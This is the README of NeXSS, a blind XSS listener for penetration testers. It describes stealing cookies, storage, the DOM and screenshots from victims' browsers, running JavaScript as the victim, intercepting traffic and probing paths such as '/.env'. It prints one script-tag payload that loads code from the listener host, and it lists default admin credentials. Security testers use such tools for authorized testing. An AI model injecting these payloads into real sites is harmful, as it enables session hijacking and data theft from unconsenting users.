<p align="center">
  <img src="public/nexss-logo-horizontal.png" alt="NeXSS Logo" width="250">
</p>

<p align="center">
  <strong>Lightweight Blind XSS Listener</strong>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#configuration">Configuration</a>
</p>

<p align="center">
  <a href="https://vercel.com/new/clone?repository-url=https://github.com/mastomii/nexss">
    <img src="https://img.shields.io/badge/Deploy-Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white" alt="Deploy with Vercel">
  </a>
  <a href="https://neon.tech">
    <img src="https://img.shields.io/badge/Database-Neon-00e599?style=for-the-badge&logo=postgresql&logoColor=white" alt="Get Neon Database">
  </a>
  <a href="https://dash.cloudflare.com/sign-up/r2">
    <img src="https://img.shields.io/badge/Storage-Cloudflare%20R2-f38020?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Get Cloudflare R2">
  </a>
</p>

---

## Description

**NeXSS** is a modern, self-hosted Blind XSS (Cross-Site Scripting) hunter and callback listener built with Next.js. It helps security researchers and penetration testers discover and validate blind XSS vulnerabilities by capturing detailed information when payloads execute on target systems.

When your XSS payload triggers on a vulnerable application, NeXSS captures comprehensive data including cookies, DOM content, screenshots, local/session storage, and more — all delivered to your dashboard in real-time with optional Telegram notifications.

<p align="center">
  <img src="images/nexss-dashboard.png" alt="NeXSS Dashboard" width="100%">
  <br>
  <em>Dashboard with real-time statistics and recent reports</em>
</p>

## Features

| Feature | Description |
|---------|-------------|
| Blind XSS Detection | Automatically captures data when payloads execute |
| Screenshot Capture | Takes screenshots of the vulnerable page using html2canvas |
| Cookie Extraction | Captures all accessible cookies from the target |
| DOM Capture | Stores the full HTML content of the affected page |
| Storage Extraction | Captures localStorage and sessionStorage data |
| Request Details | Logs URL, origin, referer, user-agent, and IP address |
| Persistent Sessions | Maintain connection with compromised browsers for JS command execution |
| Traffic Interception | Observe HTTP requests/responses within victim's browser session |
| **Path Enumeration** | **NEW** - Automatically probe sensitive paths and capture responses |
| **Grouped View** | **NEW** - Organize reports by origin/domain for better analysis |
| AES-256 Encryption | Secure communication channel for persistent sessions |
| Telegram Notifications | Real-time alerts with screenshots when XSS triggers |
| Object Storage | Store screenshots in S3, MinIO, or Cloudflare R2 |
| JWT Authentication | Secure session management |
| Docker Ready | Easy deployment with Docker Compose |

## Installation

### Prerequisites
- Docker & Docker Compose (recommended)
- Or: Node.js 18+ and PostgreSQL 15+

### Free Cloud Deployment

Deploy NeXSS for free using these services:

| Service | Purpose | Free Tier |
|---------|---------|-----------|
| [Vercel](https://vercel.com) | Next.js Hosting | Unlimited projects |
| [NeonDB](https://neon.tech) | PostgreSQL Database | 0.5 GB storage |
| [Cloudflare R2](https://cloudflare.com/r2) | Object Storage | 10 GB storage |

### Quick Start with Docker

```bash
# Clone the repository
git clone https://github.com/mastomii/nexss.git
cd nexss

# Configure environment
cp .env.example .env

# Start the application
docker compose up -d
```

Edit `.env` with your settings:

```env
# Database
DATABASE_URL=postgresql://nexss:your_secure_password@db:5432/nexss
POSTGRES_USER=nexss
POSTGRES_PASSWORD=your_secure_password
POSTGRES_DB=nexss

# Authentication (generate with: openssl rand -hex 32)
JWT_SECRET=your_jwt_secret_here
NEXTAUTH_SECRET=your_nextauth_secret_here
NEXTAUTH_URL=http://localhost:3000

# Public URL for payload callbacks
NEXT_PUBLIC_APP_URL=https://your-nexss-domain.com
```

Access the dashboard at `http://localhost:3000`

| | |
|---|---|
| Username | `admin` |
| Password | `admin123` |

> **Important:** Change the default password immediately after first login.

### Manual Installation

```bash
# Clone and install
git clone https://github.com/mastomii/nexss.git
cd nexss
npm install

# Setup database
psql -U postgres -c "CREATE DATABASE nexss;"
psql -U postgres -d nexss -f init.sql

# Configure and run
cp .env.example .env.local
npm run build
npm start
```

## Usage

### XSS Payloads

Configure your payloads from the Payloads page. Multiple payload formats are available:

<p align="center">
  <img src="images/nexss-payloads.png" alt="Payload Configuration" width="100%">
  <br>
  <em>Payload configuration with multiple injection formats</em>
</p>

Basic script tag injection:

```html
<script src="https://your-nexss-domain.com/"></script>
```

### Viewing Reports

All captured XSS triggers are displayed in the Reports page with filtering and search:

<p align="center">
  <img src="images/nexss-reports.png" alt="Reports List" width="100%">
  <br>
  <em>Reports list with timestamps and victim information</em>
</p>

#### Grouped View (NEW)

Switch to **Grouped View** to organize reports by origin/domain. This helps analyze attacks across multiple pages of the same target:

<p align="center">
  <img src="images/nexss-grouped-view.png" alt="Grouped View" width="100%">
  <br>
  <em>Reports grouped by origin with expand/collapse and unread counts</em>
</p>

Key features:
- **Group by Origin** - Reports organized by domain/hostname
- **Expand/Collapse** - Click to view reports within each group
- **Statistics per Group** - Total reports and unread count
- **Pagination** - Navigate through groups efficiently

Click on any report to view detailed information:

<p align="center">
  <img src="images/nexss-report-details.png" alt="Report Details" width="100%">
  <br>
  <em>Detailed report view with screenshot, cookies, DOM, and storage data</em>
</p>

### Persistent Sessions

Enable persistent mode to maintain a connection with compromised browsers. This allows you to:

- Execute JavaScript commands in the victim's browser
- Retrieve additional data on-demand
- Perform actions as the victim user

<p align="center">
  <img src="images/nexss-persistent-mode.png" alt="Persistent Mode" width="100%">
  <br>
  <em>Remote command execution on compromised browser sessions</em>
</p>

> **Note:** AES encryption for persistent sessions requires the target page to be served over HTTPS (Web Crypto API limitation). On HTTP targets, commands are sent unencrypted.

### Traffic Interception

**Traffic Interception** allows you to observe HTTP requests and responses happening within the victim's browser session. This feature provides visibility into API calls, form submissions, and navigation events.

<p align="center">
  <img src="images/nexss-traffic-interception-1.png" alt="NeXSS Traffic Interception" width="100%">
  <br>
  <em>Traffic interception showing captured HTTP requests</em>
</p>

<p align="center">
  <img src="images/nexss-traffic-interception-2.png" alt="NeXSS Traffic Interception" width="100%">
  <br>
  <em>Request and response details with headers</em>
</p>

<p align="center">
  <img src="images/nexss-traffic-interception-3.png" alt="NeXSS Traffic Interception" width="100%">
  <br>
  <em>Copy raw HTTP request/response for external tools</em>
</p>

#### What It Captures

| Type | Description |
|------|-------------|
| `fetch` | Fetch API request + response (combined) |
| `xhr` | XMLHttpRequest + response (combined) |
| `form` | Form submission request data |
| `navigation` | Page navigation events |

#### Key Features

- **Unified Request/Response Capture** - Each traffic entry contains both request and response data
- **Complete HTTP Headers** - Reconstructs browser-inferred headers (Host, User-Agent, Accept, etc.)
- **Raw HTTP Format** - Easy copy-paste to tools like Burp Suite
- **Real-time Session Status** - Connected/Disconnected/Terminated states
- **Color-coded UI** - Methods (GET=green, POST=amber, etc.) and status codes (2xx=green, 4xx+=red)
- **Pagination** - 20 items per page for large traffic volumes
- **One-click Copy** - Copy URLs, full requests, and full responses

#### How to Enable

1. Go to **Settings** → **XSS Payload Settings**
2. Enable **Persistent Mode**
3. Enable **Advanced Persistent Mode (Experimental)**
4. *(Optional)* Generate an **AES-256 encryption key** for encrypted communication

#### Known Limitations

- **Race Condition** - Requests firing before DOM ready may not be captured
- **HttpOnly Cookies** - Cannot be read via JavaScript
- **Cross-Origin** - Cannot read response bodies from cross-origin requests (CORS)
- **HTTPS Required** - AES-256 encryption only works on HTTPS targets
- **Body Size Limits** - Request/response bodies truncated to 10KB

> **Note:** Traffic Interception is marked as **Experimental**. This is application-layer observation only, not network-level packet capture.

### Path Enumeration (NEW)

**Path Enumeration** automatically probes predefined sensitive paths on the target origin when XSS triggers. This helps discover hidden endpoints, configuration files, and internal resources.

<p align="center">
  <img src="images/nexss-path-enumeration-1.png" alt="Path Enumeration Configuration" width="100%">
  <br>
  <em>Configure paths to enumerate in Payloads page</em>
</p>

<p align="center">
  <img src="images/nexss-path-enumeration-2.png" alt="Path Enumeration Results" width="100%">
  <br>
  <em>Enumeration results showing status codes and response sizes</em>
</p>

<p align="center">
  <img src="images/nexss-path-enumeration-3.png" alt="Path Enumeration Response" width="100%">
  <br>
  <em>View full response body and headers for each path</em>
</p>

#### How to Use

1. Go to **Payloads** page
2. Scroll to **Path Enumeration** section
3. Add paths to probe (e.g., `/robots.txt`, `/admin`, `/.env`)
4. When XSS triggers, paths are fetched from victim's browser
5. View results in report detail under **Enumeration** tab

#### What It Captures

| Data | Description |
|------|-------------|
| Status Code | HTTP response status (200, 403, 404, etc.) |
| Response Size | Size of the response body in bytes |
| Response Body | First 10KB of response content |
| Headers | HTTP response headers |

#### Benefits

- **Same-Origin Context** - Requests are made from victim's browser, bypassing IP-based restrictions
- **Authenticated Requests** - Uses victim's cookies and session
- **Internal Discovery** - Access internal endpoints not visible externally
- **Configurable Paths** - Add custom paths per engagement

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `DATABASE_URL` | PostgreSQL connection string | Required |
| `JWT_SECRET` | Secret for JWT signing | Required |
| `NEXTAUTH_SECRET` | NextAuth.js secret | Required |
| `NEXTAUTH_URL` | Application base URL | `http://localhost:3000` |
| `NEXT_PUBLIC_APP_URL` | Public URL for payload callbacks | Uses request host |
| `NODE_ENV` | Environment mode | `production` |

### Object Storage

Store screenshots externally using S3-compatible storage:

<p align="center">
  <img src="images/nexss-object-storage.png" alt="Object Storage Settings" width="100%">
  <br>
  <em>Object storage configuration with S3, MinIO, or Cloudflare R2</em>
</p>

Supported providers:
- AWS S3
- MinIO
- Cloudflare R2

### Telegram Notifications

Get real-time alerts when XSS payloads trigger:

<p align="center">
  <img src="images/nexss-telegram-notif.png" alt="Telegram Notification" width="100%">
  <br>
  <em>Telegram notification with screenshot preview</em>
</p>

Setup:
1. Create a bot via [@BotFather](https://t.me/BotFather)
2. Go to **Settings** > **Telegram Notifications**
3. Enter your bot token
4. Send `/start` to your bot
5. Click "Get Chat ID" to auto-detect
6. Send a test message to verify

## Contributing

Contributions are welcome. Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This tool is intended for **authorized security testing only**. Only use NeXSS against systems you have explicit permission to test. Unauthorized access to computer systems is illegal. The developers assume no liability for misuse of this software.
